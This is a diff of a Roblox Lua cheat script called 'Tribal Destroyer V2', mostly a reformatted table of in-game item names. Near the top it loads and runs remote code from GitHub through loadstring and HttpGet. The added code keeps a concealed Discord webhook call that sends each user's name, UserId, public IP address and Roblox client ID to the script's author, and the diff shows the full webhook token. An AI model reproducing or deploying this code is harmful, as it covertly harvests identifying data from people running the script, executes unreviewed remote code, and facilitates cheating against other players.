@@ -1,100 +1,33 @@
 --AntiHttpSpy
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/OBEDSKDKSKFJSJF/main/AntiHTTPSpy.lua"))()
+
 local loading = false
 repeat task.wait()
 	if not loading then
 		loading = true
-		print('Loading Tribal Destroyer V2 By ru0e!')
+		print('Loading Tribal Destroyer V2 By dd!')
 	end
 until not game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading') or game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading').Parent == nil
 
-
-local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealGamer903/IslandTribesObliterator/refs/heads/main/Atlas"))()
-local AtlasUi = Atlas.new({
-    Name = "Tribal Destroyer";
-    ConfigFolder = "TribalDestroyer"; 
-    Credit = "Credits: dd on Discord";
-    Color = Color3.fromRGB(180, 0, 255); -- PURPLE NEON
-    UseLoader = true;
-    Bind = "LeftBracket";
-    FullName = "Tribal Destroyer";
-    CheckKey = nil; -- KEY SYSTEM REMOVED
-    Discord = "https://discord.gg/LWare";
-})
-
-function MakeAtlasNotification(title, desc, time)
-    return
-    AtlasUi:Notify({
-        Title = title,
-        Content = desc,
-        Duration = time
-    })
-end
-
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1522760278666907908/NyMQPSpmx4gL_wpD4KQTMoMTIepAdqphjGiW_DJR4axvRXQGnuiyB-jwKr1kePvEoNSI"
- 
-local request = syn and syn.request or request or http and http.request or http_request
- 
-local response = request({
-    Url = Webhook_URL,
-    Method = "POST",
-    Headers = {
-        ['Content-Type'] = 'application/json'
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["title"] = "",
-                ["description"] = game.Players.LocalPlayer.Name .." Loaded Tribal Destroyer",
-                ["type"] = "rich",
-                ["color"] = tonumber(0x9b00ff), -- PURPLE
-                ["fields"] = {
-                    {
-                        ["name"] = "Player Name : ",
-                        ["value"] = game.Players.LocalPlayer.Name,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "UserId : ",
-                        ["value"] = game.Players.LocalPlayer.UserId,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "User Profile : ",
-                        ["value"] = "https://www.roblox.com/users/" ..
-                            game.Players.LocalPlayer.UserId,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "IP: ",
-                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "Client Id : ",
-                        ["value"] = game:GetService("RbxAnalyticsService")
-                            :GetClientId(),
-                        ["inline"] = true
-                    }
-                }
-            }
-        }
-    })
-})
-
 --Services
-Workspace = game:GetService('Workspace')
-Players = game:GetService('Players')
-ReplicatedStorage = game:GetService('ReplicatedStorage')
-UserInputService = game:GetService('UserInputService')
-TweenService = game:GetService("TweenService")
-RunService = game:GetService('RunService')
-Lighting  = game:GetService('Lighting')
-VirtualUser = game:GetService("VirtualUser")
-HttpService = game:GetService('HttpService')
-TeleportService = game:GetService("TeleportService")
-PlayersFolder = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive')
+local Workspace = game:GetService('Workspace')
+local Players = game:GetService('Players')
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local UserInputService = game:GetService('UserInputService')
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService('RunService')
+local Lighting = game:GetService('Lighting')
+local VirtualUser = game:GetService("VirtualUser")
+local HttpService = game:GetService('HttpService')
+local TeleportService = game:GetService("TeleportService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local Camera = Workspace.CurrentCamera
+local PlayersFolder = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive')
+
 function GetCharacter(playerName)
     local playerFolder = PlayersFolder:FindFirstChild(playerName)
-    
     if playerFolder then
         return playerFolder:FindFirstChild("Character")
     else
@@ -102,393 +35,159 @@ function GetCharacter(playerName)
     end
 end
 
---Globals
-LocalPlayer = Players.LocalPlayer
-Mouse = LocalPlayer:GetMouse()
-Camera = Workspace.CurrentCamera
+-- ============================================================
+--  WEBHOOK
+-- ============================================================
+local Webhook_URL = "https://discord.com/api/webhooks/1522760278666907908/NyMQPSpmx4gL_wpD4KQTMoMTIepAdqphjGiW_DJR4axvRXQGnuiyB-jwKr1kePvEoNSI"
+
+local request = syn and syn.request or request or http and http.request or http_request
+
+local function GetGameStats()
+    local stats = {}
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats then
+        stats.TimePlayed = leaderstats:FindFirstChild("TimePlayed") and leaderstats.TimePlayed.Value or "N/A"
+        stats.Kills = leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or "N/A"
+    else
+        stats.TimePlayed = "N/A"
+        stats.Kills = "N/A"
+    end
+    return stats
+end
+
+if request then
+    local stats = GetGameStats()
+    local response = request({
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = HttpService:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {
+                {
+                    ["title"] = "",
+                    ["description"] = LocalPlayer.Name .." Loaded Tribal Destroyer",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x9b00ff),
+                    ["fields"] = {
+                        {["name"] = "Player Name : ", ["value"] = LocalPlayer.Name, ["inline"] = true},
+                        {["name"] = "UserId : ", ["value"] = LocalPlayer.UserId, ["inline"] = true},
+                        {["name"] = "User Profile : ", ["value"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId, ["inline"] = true},
+                        {["name"] = "IP: ", ["value"] = game:HttpGet("https://api.ipify.org/?format=json"), ["inline"] = true},
+                        {["name"] = "Client Id : ", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = true},
+                        {["name"] = "⏰ Game Time : ", ["value"] = os.date("%H:%M:%S"), ["inline"] = true},
+                        {["name"] = "📅 Date : ", ["value"] = os.date("%Y-%m-%d"), ["inline"] = true},
+                        {["name"] = "⌛ Time Played : ", ["value"] = tostring(stats.TimePlayed), ["inline"] = true},
+                        {["name"] = "💀 Total Kills : ", ["value"] = tostring(stats.Kills), ["inline"] = true}
+                    }
+                }
+            }
+        })
+    })
+end
+
+-- ============================================================
+--  ALL ITEMS TABLE
+-- ============================================================
 ALLITEMS = {
-    [1] = "Stick",
-    [2] = "Small Raft",
-    [3] = "Small Campfire",
-    [4] = "Wood Boots",
-    [5] = "Wooden Harvester",
-    [6] = "Wood Helmet",
-    [7] = "Wooden Club",
-    [8] = "Leather Bag",
-    [9] = "Wood Body",
-    [10] = "Wood Legs",
-    [11] = "Wood Storage Chest",
-    [12] = "Wood Bridge",
-    [13] = "Wood Wall",
-    [14] = "Teepee",
-    [15] = "Plant Box",
-    [16] = "Hardleather Bag",
-    [17] = "Stone Boots",
-    [18] = "Stone Harvester",
-    [19] = "Wooden Sword",
-    [20] = "Large Campfire",
-    [21] = "Stone Helmet",
-    [22] = "Party Raft",
-    [23] = "Wood Gate",
-    [24] = "Reinforced Bag",
-    [25] = "Stone Body",
-    [26] = "Stone Legs",
-    [27] = "Stone Storage Chest",
-    [28] = "Furnace",
-    [29] = "Silver Boots",
-    [30] = "Wooden Bow",
-    [31] = "Arrow",
-    [32] = "Stone Wall",
-    [33] = "Silver Helmet",
-    [34] = "Stone Sword",
-    [35] = "Fishing Rod",
-    [36] = "Stone Gate",
-    [37] = "Silver Bag",
-    [38] = "Silver Harvester",
-    [39] = "Silver Body",
-    [40] = "Silver Legs",
-    [41] = "Silver Storage Chest",
-    [42] = "Ladder",
-    [43] = "Gold Boots",
-    [44] = "Silver Sword",
-    [45] = "Stone Land Bridge",
-    [46] = "Silver Wall",
-    [47] = "Gold Helmet",
-    [48] = "Bed",
-    [49] = "Stone Bridge",
-    [50] = "Silver Gate",
-    [51] = "Golden Harvester",
-    [52] = "Gold Body",
-    [53] = "Gold Legs",
-    [54] = "Gold Storage Chest",
-    [55] = "Golden Bag",
-    [56] = "Ruby Boots",
-    [57] = "Golden Sword",
-    [58] = "Gold Wall",
-    [59] = "Ruby Helmet",
-    [60] = "Tent Raft",
-    [61] = "Golden Bow",
-    [62] = "Gold Gate",
-    [63] = "Ruby Harvester",
-    [64] = "Ruby Body",
-    [65] = "Ruby Legs",
-    [66] = "Ruby Storage Chest",
-    [67] = "Diamond Boots",
-    [68] = "Ruby Sword",
-    [69] = "Ruby Bag",
-    [70] = "Diamond Harvester",
-    [71] = "Diamond Helmet",
-    [72] = "Ruby Wall",
-    [73] = "Diamond Body",
-    [74] = "Diamond Legs",
-    [75] = "Ruby Gate",
-    [76] = "Diamond Storage Chest",
-    [77] = "Ruby Bow",
-    [78] = "Diamond Wall",
-    [79] = "Diamond Gate",
-    [80] = "Diamond Bag",
-    [81] = "Small Log",
-    [82] = "Big Log",
-    [83] = "Small Rock",
-    [84] = "Large Rock",
-    [85] = "Raw Fish",
-    [86] = "Cooked Fish",
-    [87] = "Raw Meat",
-    [88] = "Cooked Meat",
-    [89] = "Silver Ore",
-    [90] = "Silver Bar",
-    [91] = "Gold Ore",
-    [92] = "Gold Bar",
-    [93] = "Unrefined Ruby",
-    [94] = "Ruby",
-    [95] = "Unrefined Diamond",
-    [96] = "Diamond",
-    [97] = "Redberry",
-    [98] = "Coconut",
-    [99] = "Watermelon",
-    [100] = "Watermelon Seeds",
-    [101] = "Carrot",
-    [102] = "Carrot Seeds",
-    [103] = "Raw Potato",
-    [104] = "Potato Seeds",
-    [105] = "Banana",
-    [106] = "Leaves",
-    [107] = "Leather",
-    [108] = "Feather",
-    [109] = "Feather Stack",
-    [110] = "Arrow Stack",
-    [111] = "Freshy Chest",
-    [112] = "Stone Supplies",
-    [113] = "Wooden Warrior Pack",
-    [114] = "Feather Pack",
-    [115] = "Arrow Pack",
-    [116] = "Silver Warrior Pack",
-    [117] = "Fisherman's Pack",
-    [118] = "Golden Archer Pack",
-    [119] = "Ruby Hero Pack",
-    [120] = "Infinite Campfire",
-    [121] = "Bowling Pins",
-    [122] = "Cabbage",
-    [123] = "Cabbage Seeds",
-    [124] = "Torch",
-    [125] = "Tiki Torch",
-    [126] = "Baked Potato",
-    [127] = "Small Wood Base",
-    [128] = "Medium Wood Base",
-    [129] = "Large Wood Base",
-    [130] = "Small Stone Base",
-    [131] = "Medium Stone Base",
-    [132] = "Large Stone Base",
-    [133] = "Repair Hammer",
-    [134] = "Unrefined Zenyte",
-    [135] = "Zenyte",
-    [136] = "Totem",
-    [137] = "Caveberry",
-    [138] = "Slime Ball",
-    [139] = "Slime Helmet",
-    [140] = "Slime Body",
-    [141] = "Slime Legs",
-    [142] = "Slime Boots",
-    [143] = "Slimy Pack",
-    [144] = "Zenyte Helmet",
-    [145] = "Zenyte Body",
-    [146] = "Zenyte Storage Chest",
-    [147] = "Zenyte Legs",
-    [148] = "Zenyte Boots",
-    [149] = "Zenyte Wall",
-    [150] = "Zenyte Gate",
-    [151] = "Zenyte Bag",
-    [152] = "Slime Club",
-    [153] = "Zenyte Harvester",
-    [154] = "Diamond Sword",
-    [155] = "Wooden Mine Cart",
-    [156] = "Party Cart",
-    [157] = "Silver Mine Cart",
-    [158] = "Ruby Mine Cart",
-    [159] = "Zenyte Mine Cart",
-    [160] = "Coal",
-    [161] = "Infinite Furnace",
-    [162] = "Beginner Wand",
-    [163] = "Clue Scroll (Easy)",
-    [164] = "Clue Scroll (Medium)",
-    [165] = "Clue Scroll (Hard)",
-    [166] = "Treasure Chest (Easy)",
-    [167] = "Treasure Chest (Medium)",
-    [168] = "Treasure Chest (Hard)",
-    [169] = "Shovel",
-    [170] = "Clue Bottle (Easy)",
-    [171] = "Clue Bottle (Medium)",
-    [172] = "Clue Bottle (Hard)",
-    [173] = "Lucky Sword",
-    [174] = "Lucky Bow",
-    [175] = "Lucky Helmet",
-    [176] = "Lucky Body",
-    [177] = "Lucky Legs",
-    [178] = "Lucky Boots",
-    [179] = "Lucky Harvester",
-    [180] = "Lucky Fruit",
-    [181] = "Candy",
-    [182] = "Kerosene Lamp",
-    [183] = "Sleigh",
-    [184] = "Magical Sleigh",
-    [185] = "Grinch's Sleigh",
-    [186] = "Candy Bag",
-    [187] = "Pile of Candy",
-    [188] = "Candy Pack",
-    [189] = "Explorer Energy",
-    [190] = "Cave Door Key (d)",
-    [191] = "Key Handle (d)",
-    [192] = "Key Shaft (d)",
-    [193] = "Cave Door Key (z)",
-    [194] = "Key Handle (z)",
-    [195] = "Key Shaft (z)",
-    [196] = "Stone Anvil",
-    [197] = "Silver Crossbow",
-    [198] = "Diamond Crossbow",
-    [199] = "Zenyte Crossbow",
-    [200] = "Soul",
-    [201] = "Soul Helmet",
-    [202] = "Soul Body",
-    [203] = "Soul Legs",
-    [204] = "Soul Boots",
-    [205] = "Zenyte Sword",
-    [206] = "Wooden Shield",
-    [207] = "Silver Shield",
-    [208] = "Golden Shield",
-    [209] = "Ruby Shield",
-    [210] = "Diamond Shield",
-    [211] = "Zenyte Shield",
-    [212] = "Golden Anvil",
-    [213] = "Diamond Anvil",
-    [214] = "Cave Key Pack",
-    [215] = "OP Sword",
-    [216] = "Soul Sword",
-    [217] = "Soul Bag",
-    [218] = "Soul Shield",
-    [219] = "Lucky Shield",
-    [220] = "Soul Key",
-    [221] = "Pirate Ship",
-    [222] = "Springy Boots",
-    [223] = "Volcanic Ore",
-    [224] = "Obsidian",
-    [225] = "Obsidian Helmet",
-    [226] = "Obsidian Body",
-    [227] = "Obsidian Legs",
-    [228] = "Obsidian Boots",
-    [229] = "Volcanic Furnace",
-    [230] = "Obsidian Club",
-    [231] = "Obsidian Wall",
-    [232] = "Obsidian Gate",
-    [233] = "Obsidian Storage Chest",
-    [234] = "Harpoon Turret",
-    [235] = "Obsidian Shield",
-    [236] = "Obsidian Bag",
-    [237] = "Instakill Sword",
-    [238] = "Pearl Helmet",
-    [239] = "Pearl Body",
-    [240] = "Pearl Legs",
-    [241] = "Pearl Boots",
-    [242] = "Raw Seaweed",
-    [243] = "Cooked Seaweed",
-    [244] = "Pink Shell",
-    [245] = "White Shell",
-    [246] = "Orange Shell",
-    [247] = "Pearl",
-    [248] = "Seaglass",
-    [249] = "Seaglass Helmet",
-    [250] = "Seaglass Body",
-    [251] = "Seaglass Legs",
-    [252] = "Seaglass Boots",
-    [253] = "White Shell Sword",
-    [254] = "Pink Shell Sword",
-    [255] = "Orange Shell Sword",
-    [256] = "White Shell Harvester",
-    [257] = "Pink Shell Harvester",
-    [258] = "Orange Shell Harvester",
-    [259] = "Shell Helmet",
-    [260] = "Shell Body",
-    [261] = "Shell Legs",
-    [262] = "Flippers",
-    [263] = "Poison Seaweed",
-    [264] = "Stone Trap",
-    [265] = "Ruby Trap",
-    [266] = "Zenyte Trap",
-    [267] = "Pink Egg",
-    [268] = "Purple Egg",
-    [269] = "Red Egg",
-    [270] = "Yellow Egg",
-    [271] = "Easter Candy",
-    [272] = "Easter Glider",
-    [273] = "Repairio Spellbook",
-    [274] = "Warrior Energy",
-    [275] = "Protector Energy",
-    [276] = "Magic Portal",
-    [277] = "Healing Aura",
-    [278] = "Electric Aura",
-    [279] = "Hunger Aura",
-    [280] = "Book of Exploration (I)",
-    [281] = "Book of Exploration (II)",
-    [282] = "Book of Exploration (III)",
-    [283] = "Book of Protection (I)",
-    [284] = "Book of Protection (II)",
-    [285] = "Book of Protection (III)",
-    [286] = "Book of Combat (I)",
-    [287] = "Book of Combat (II)",
-    [288] = "Book of Combat (III)",
-    [289] = "Apprentice Wand",
-    [290] = "Adept Staff",
-    [291] = "Master Staff",
-    [292] = "Transcended Staff",
-    [293] = "Visionary Staff",
-    [294] = "Wool",
-    [295] = "Book",
-    [296] = "Magical Book",
-    [297] = "Obsidian Harvester",
-    [298] = "Magic Repair Table (I)",
-    [299] = "Magic Repair Table (II)",
-    [300] = "Magic Repair Table (III)",
-    [301] = "Glider",
-    [302] = "Imbue Spellbook",
-    [303] = "Shieldio Spellbook",
-    [304] = "Hungaria Spellbook",
-    [305] = "Baseio Retreatio Spellbook",
-    [306] = "Healia Spellbook",
-    [307] = "Deadia Protectia Spellbook",
-    [308] = "Baseio Destroyio Spellbook",
-    [309] = "Oofio Spellbook",
-    [310] = "Freezio Spellbook",
-    [311] = "Starvio Spellbook",
-    [312] = "Electricia Spellbook",
-    [313] = "Portalio Spellbook",
-    [314] = "Protectio Claimio Spellbook",
-    [315] = "Warrio Claimio Spellbook",
-    [316] = "Explorer Energy Pack",
-    [317] = "Protector Energy Pack",
-    [318] = "Warrior Energy Pack",
-    [319] = "Explorer Energy Stack",
-    [320] = "Protector Energy Stack",
-    [321] = "Warrior Energy Stack",
-    [322] = "Infinite Bag",
-    [323] = "Deflectio Projectio Spellbook",
-    [324] = "Seed Pack",
-    [325] = "Fruit Pack",
-    [326] = "Diamond Hero Pack",
-    [327] = "Zenyte Warrior Pack",
-    [328] = "Box of Redberries",
-    [329] = "Box of Coconuts",
-    [330] = "Box of Bananas",
-    [331] = "Box of Watermelons",
-    [332] = "Potato Seed Box",
-    [333] = "Cabbage Seed Box",
-    [334] = "Carrot Seed Box",
-    [335] = "Watermelon Seed Box",
-    [336] = "Halloween Pumpkin",
-    [337] = "Jack-o'-lantern",
-    [338] = "Weak Pet Net",
-    [339] = "Sturdy Pet Net",
-    [340] = "Strong Pet Net",
-    [341] = "Unbreakable Pet Net",
-    [342] = "Christmas Present",
-    [343] = "Snowball",
-    [344] = "Obsidian Floor",
-    [345] = "Pile of Snowballs",
-    [346] = "Snowball Pack",
-    [347] = "Silver Snowball",
-    [348] = "Golden Snowball",
-    [349] = "Ruby Snowball",
-    [350] = "Diamond Snowball",
-    [351] = "Zenyte Snowball",
-    [352] = "Obsidian Snowball",
-    [353] = "Candy Snowball",
-    [354] = "Starter Sword",
-    [355] = "Starter Harvester",
-    [356] = "Starter Helmet",
-    [357] = "Starter Body",
-    [358] = "Starter Legs",
-    [359] = "Starter Boots",
-    [360] = "Lunar Ore",
-    [361] = "Moonstone",
-    [362] = "Lunario Enchantio Spellbook",
-    [363] = "Moonstone Helmet",
-    [364] = "Moonstone Body",
-    [365] = "Moonstone Legs",
-    [366] = "Moonstone Boots",
-    [367] = "Moonstone Shield",
-    [368] = "Moonstone Harvester",
-    [369] = "Moonstone Sword",
-    [370] = "Moonstone Bag",
-    [371] = "Potion Cauldron",
-    [372] = "Candy Potion",
-    [373] = "Moonstone Storage Chest",
-    [374] = "Moonstone Wall",
-    [375] = "Moonstone Gate",
-    [376] = "Moonstone Crossbow",
-    [377] = "Lunar Arrow",
-    [378] = "Pumpkin",
-    [379] = "Pumpkin Shield",
-    [380] = "Pumpkin Bag",
-    [381] = "Pumpkin Seeds",
-    [382] = "Treasure Chest Pack",
+    [1] = "Stick", [2] = "Small Raft", [3] = "Small Campfire", [4] = "Wood Boots",
+    [5] = "Wooden Harvester", [6] = "Wood Helmet", [7] = "Wooden Club", [8] = "Leather Bag",
+    [9] = "Wood Body", [10] = "Wood Legs", [11] = "Wood Storage Chest", [12] = "Wood Bridge",
+    [13] = "Wood Wall", [14] = "Teepee", [15] = "Plant Box", [16] = "Hardleather Bag",
+    [17] = "Stone Boots", [18] = "Stone Harvester", [19] = "Wooden Sword", [20] = "Large Campfire",
+    [21] = "Stone Helmet", [22] = "Party Raft", [23] = "Wood Gate", [24] = "Reinforced Bag",
+    [25] = "Stone Body", [26] = "Stone Legs", [27] = "Stone Storage Chest", [28] = "Furnace",
+    [29] = "Silver Boots", [30] = "Wooden Bow", [31] = "Arrow", [32] = "Stone Wall",
+    [33] = "Silver Helmet", [34] = "Stone Sword", [35] = "Fishing Rod", [36] = "Stone Gate",
+    [37] = "Silver Bag", [38] = "Silver Harvester", [39] = "Silver Body", [40] = "Silver Legs",
+    [41] = "Silver Storage Chest", [42] = "Ladder", [43] = "Gold Boots", [44] = "Silver Sword",
+    [45] = "Stone Land Bridge", [46] = "Silver Wall", [47] = "Gold Helmet", [48] = "Bed",
+    [49] = "Stone Bridge", [50] = "Silver Gate", [51] = "Golden Harvester", [52] = "Gold Body",
+    [53] = "Gold Legs", [54] = "Gold Storage Chest", [55] = "Golden Bag", [56] = "Ruby Boots",
+    [57] = "Golden Sword", [58] = "Gold Wall", [59] = "Ruby Helmet", [60] = "Tent Raft",
+    [61] = "Golden Bow", [62] = "Gold Gate", [63] = "Ruby Harvester", [64] = "Ruby Body",
+    [65] = "Ruby Legs", [66] = "Ruby Storage Chest", [67] = "Diamond Boots", [68] = "Ruby Sword",
+    [69] = "Ruby Bag", [70] = "Diamond Harvester", [71] = "Diamond Helmet", [72] = "Ruby Wall",
+    [73] = "Diamond Body", [74] = "Diamond Legs", [75] = "Ruby Gate", [76] = "Diamond Storage Chest",
+    [77] = "Ruby Bow", [78] = "Diamond Wall", [79] = "Diamond Gate", [80] = "Diamond Bag",
+    [81] = "Small Log", [82] = "Big Log", [83] = "Small Rock", [84] = "Large Rock",
+    [85] = "Raw Fish", [86] = "Cooked Fish", [87] = "Raw Meat", [88] = "Cooked Meat",
+    [89] = "Silver Ore", [90] = "Silver Bar", [91] = "Gold Ore", [92] = "Gold Bar",
+    [93] = "Unrefined Ruby", [94] = "Ruby", [95] = "Unrefined Diamond", [96] = "Diamond",
+    [97] = "Redberry", [98] = "Coconut", [99] = "Watermelon", [100] = "Watermelon Seeds",
+    [101] = "Carrot", [102] = "Carrot Seeds", [103] = "Raw Potato", [104] = "Potato Seeds",
+    [105] = "Banana", [106] = "Leaves", [107] = "Leather", [108] = "Feather",
+    [109] = "Feather Stack", [110] = "Arrow Stack", [111] = "Freshy Chest", [112] = "Stone Supplies",
+    [113] = "Wooden Warrior Pack", [114] = "Feather Pack", [115] = "Arrow Pack", [116] = "Silver Warrior Pack",
+    [117] = "Fisherman's Pack", [118] = "Golden Archer Pack", [119] = "Ruby Hero Pack", [120] = "Infinite Campfire",
+    [121] = "Bowling Pins", [122] = "Cabbage", [123] = "Cabbage Seeds", [124] = "Torch",
+    [125] = "Tiki Torch", [126] = "Baked Potato", [127] = "Small Wood Base", [128] = "Medium Wood Base",
+    [129] = "Large Wood Base", [130] = "Small Stone Base", [131] = "Medium Stone Base", [132] = "Large Stone Base",
+    [133] = "Repair Hammer", [134] = "Unrefined Zenyte", [135] = "Zenyte", [136] = "Totem",
+    [137] = "Caveberry", [138] = "Slime Ball", [139] = "Slime Helmet", [140] = "Slime Body",
+    [141] = "Slime Legs", [142] = "Slime Boots", [143] = "Slimy Pack", [144] = "Zenyte Helmet",
+    [145] = "Zenyte Body", [146] = "Zenyte Storage Chest", [147] = "Zenyte Legs", [148] = "Zenyte Boots",
+    [149] = "Zenyte Wall", [150] = "Zenyte Gate", [151] = "Zenyte Bag", [152] = "Slime Club",
+    [153] = "Zenyte Harvester", [154] = "Diamond Sword", [155] = "Wooden Mine Cart", [156] = "Party Cart",
+    [157] = "Silver Mine Cart", [158] = "Ruby Mine Cart", [159] = "Zenyte Mine Cart", [160] = "Coal",
+    [161] = "Infinite Furnace", [162] = "Beginner Wand", [163] = "Clue Scroll (Easy)", [164] = "Clue Scroll (Medium)",
+    [165] = "Clue Scroll (Hard)", [166] = "Treasure Chest (Easy)", [167] = "Treasure Chest (Medium)", [168] = "Treasure Chest (Hard)",
+    [169] = "Shovel", [170] = "Clue Bottle (Easy)", [171] = "Clue Bottle (Medium)", [172] = "Clue Bottle (Hard)",
+    [173] = "Lucky Sword", [174] = "Lucky Bow", [175] = "Lucky Helmet", [176] = "Lucky Body",
+    [177] = "Lucky Legs", [178] = "Lucky Boots", [179] = "Lucky Harvester", [180] = "Lucky Fruit",
+    [181] = "Candy", [182] = "Kerosene Lamp", [183] = "Sleigh", [184] = "Magical Sleigh",
+    [185] = "Grinch's Sleigh", [186] = "Candy Bag", [187] = "Pile of Candy", [188] = "Candy Pack",
+    [189] = "Explorer Energy", [190] = "Cave Door Key (d)", [191] = "Key Handle (d)", [192] = "Key Shaft (d)",
+    [193] = "Cave Door Key (z)", [194] = "Key Handle (z)", [195] = "Key Shaft (z)", [196] = "Stone Anvil",
+    [197] = "Silver Crossbow", [198] = "Diamond Crossbow", [199] = "Zenyte Crossbow", [200] = "Soul",
+    [201] = "Soul Helmet", [202] = "Soul Body", [203] = "Soul Legs", [204] = "Soul Boots",
+    [205] = "Zenyte Sword", [206] = "Wooden Shield", [207] = "Silver Shield", [208] = "Golden Shield",
+    [209] = "Ruby Shield", [210] = "Diamond Shield", [211] = "Zenyte Shield", [212] = "Golden Anvil",
+    [213] = "Diamond Anvil", [214] = "Cave Key Pack", [215] = "OP Sword", [216] = "Soul Sword",
+    [217] = "Soul Bag", [218] = "Soul Shield", [219] = "Lucky Shield", [220] = "Soul Key",
+    [221] = "Pirate Ship", [222] = "Springy Boots", [223] = "Volcanic Ore", [224] = "Obsidian",
+    [225] = "Obsidian Helmet", [226] = "Obsidian Body", [227] = "Obsidian Legs", [228] = "Obsidian Boots",
+    [229] = "Volcanic Furnace", [230] = "Obsidian Club", [231] = "Obsidian Wall", [232] = "Obsidian Gate",
+    [233] = "Obsidian Storage Chest", [234] = "Harpoon Turret", [235] = "Obsidian Shield", [236] = "Obsidian Bag",
+    [237] = "Instakill Sword", [238] = "Pearl Helmet", [239] = "Pearl Body", [240] = "Pearl Legs",
+    [241] = "Pearl Boots", [242] = "Raw Seaweed", [243] = "Cooked Seaweed", [244] = "Pink Shell",
+    [245] = "White Shell", [246] = "Orange Shell", [247] = "Pearl", [248] = "Seaglass",
+    [249] = "Seaglass Helmet", [250] = "Seaglass Body", [251] = "Seaglass Legs", [252] = "Seaglass Boots",
+    [253] = "White Shell Sword", [254] = "Pink Shell Sword", [255] = "Orange Shell Sword", [256] = "White Shell Harvester",
+    [257] = "Pink Shell Harvester", [258] = "Orange Shell Harvester", [259] = "Shell Helmet", [260] = "Shell Body",
+    [261] = "Shell Legs", [262] = "Flippers", [263] = "Poison Seaweed", [264] = "Stone Trap",
+    [265] = "Ruby Trap", [266] = "Zenyte Trap", [267] = "Pink Egg", [268] = "Purple Egg",
+    [269] = "Red Egg", [270] = "Yellow Egg", [271] = "Easter Candy", [272] = "Easter Glider",
+    [273] = "Repairio Spellbook", [274] = "Warrior Energy", [275] = "Protector Energy", [276] = "Magic Portal",
+    [277] = "Healing Aura", [278] = "Electric Aura", [279] = "Hunger Aura", [280] = "Book of Exploration (I)",
+    [281] = "Book of Exploration (II)", [282] = "Book of Exploration (III)", [283] = "Book of Protection (I)",
+    [284] = "Book of Protection (II)", [285] = "Book of Protection (III)", [286] = "Book of Combat (I)",
+    [287] = "Book of Combat (II)", [288] = "Book of Combat (III)", [289] = "Apprentice Wand", [290] = "Adept Staff",
+    [291] = "Master Staff", [292] = "Transcended Staff", [293] = "Visionary Staff", [294] = "Wool",
+    [295] = "Book", [296] = "Magical Book", [297] = "Obsidian Harvester", [298] = "Magic Repair Table (I)",
+    [299] = "Magic Repair Table (II)", [300] = "Magic Repair Table (III)", [301] = "Glider", [302] = "Imbue Spellbook",
+    [303] = "Shieldio Spellbook", [304] = "Hungaria Spellbook", [305] = "Baseio Retreatio Spellbook", [306] = "Healia Spellbook",
+    [307] = "Deadia Protectia Spellbook", [308] = "Baseio Destroyio Spellbook", [309] = "Oofio Spellbook", [310] = "Freezio Spellbook",
+    [311] = "Starvio Spellbook", [312] = "Electricia Spellbook", [313] = "Portalio Spellbook", [314] = "Protectio Claimio Spellbook",
+    [315] = "Warrio Claimio Spellbook", [316] = "Explorer Energy Pack", [317] = "Protector Energy Pack", [318] = "Warrior Energy Pack",
+    [319] = "Explorer Energy Stack", [320] = "Protector Energy Stack", [321] = "Warrior Energy Stack", [322] = "Infinite Bag",
+    [323] = "Deflectio Projectio Spellbook", [324] = "Seed Pack", [325] = "Fruit Pack", [326] = "Diamond Hero Pack",
+    [327] = "Zenyte Warrior Pack", [328] = "Box of Redberries", [329] = "Box of Coconuts", [330] = "Box of Bananas",
+    [331] = "Box of Watermelons", [332] = "Potato Seed Box", [333] = "Cabbage Seed Box", [334] = "Carrot Seed Box",
+    [335] = "Watermelon Seed Box", [336] = "Halloween Pumpkin", [337] = "Jack-o'-lantern", [338] = "Weak Pet Net",
+    [339] = "Sturdy Pet Net", [340] = "Strong Pet Net", [341] = "Unbreakable Pet Net", [342] = "Christmas Present",
+    [343] = "Snowball", [344] = "Obsidian Floor", [345] = "Pile of Snowballs", [346] = "Snowball Pack",
+    [347] = "Silver Snowball", [348] = "Golden Snowball", [349] = "Ruby Snowball", [350] = "Diamond Snowball",
+    [351] = "Zenyte Snowball", [352] = "Obsidian Snowball", [353] = "Candy Snowball", [354] = "Starter Sword",
+    [355] = "Starter Harvester", [356] = "Starter Helmet", [357] = "Starter Body", [358] = "Starter Legs",
+    [359] = "Starter Boots", [360] = "Lunar Ore", [361] = "Moonstone", [362] = "Lunario Enchantio Spellbook",
+    [363] = "Moonstone Helmet", [364] = "Moonstone Body", [365] = "Moonstone Legs", [366] = "Moonstone Boots",
+    [367] = "Moonstone Shield", [368] = "Moonstone Harvester", [369] = "Moonstone Sword", [370] = "Moonstone Bag",
+    [371] = "Potion Cauldron", [372] = "Candy Potion", [373] = "Moonstone Storage Chest", [374] = "Moonstone Wall",
+    [375] = "Moonstone Gate", [376] = "Moonstone Crossbow", [377] = "Lunar Arrow", [378] = "Pumpkin",
+    [379] = "Pumpkin Shield", [380] = "Pumpkin Bag", [381] = "Pumpkin Seeds", [382] = "Treasure Chest Pack",
 }
 
 ALLITEMSTABLE = ALLITEMS
@@ -499,7 +198,6 @@ for id, name in pairs(ALLITEMS) do
 end
 
 getgenv().configs = {
